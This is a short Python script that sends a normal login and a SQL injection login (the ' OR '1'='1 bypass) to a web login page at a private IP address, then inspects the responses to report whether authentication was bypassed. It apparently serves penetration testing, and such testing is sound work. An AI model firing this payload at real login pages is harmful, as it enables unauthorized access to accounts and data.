import requests

# Target login URL
url = "http://172.168.10.20:8081/help/loginn.php"

# Normal login attempt with valid credentials
normal_payload = {
    "username": "Admin",
    "password": "1234"
}

# SQL injection payload
sqli_payload = {
    "username": "' OR '1'='1",
    "password": "anything"
}

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Send normal login
normal_response = requests.post(url, data=normal_payload, headers=headers)
print("[+] Normal Login Response Code:", normal_response.status_code)
print("[+] Normal Login Response Snippet:\n", normal_response.text[:300])

# Send SQL injection login
sqli_response = requests.post(url, data=sqli_payload, headers=headers)
print("\n[+] SQL Injection Attempt Response Code:", sqli_response.status_code)
print("[+] SQLi Response Snippet:\n", sqli_response.text[:300])

# Basic interpretation logic
if ("Dashboard" in sqli_response.text or "Welcome" in sqli_response.text) and sqli_response.status_code == 200:
    print("\n[!] Potential SQL Injection Vulnerability Detected!")
elif "Invalid" in sqli_response.text or "Login failed" in sqli_response.text:
    print("\n[+] SQL Injection attempt was blocked successfully.")
else:
    print("\n[?] Could not clearly determine outcome from SQLi attempt. Please review the response manually.")
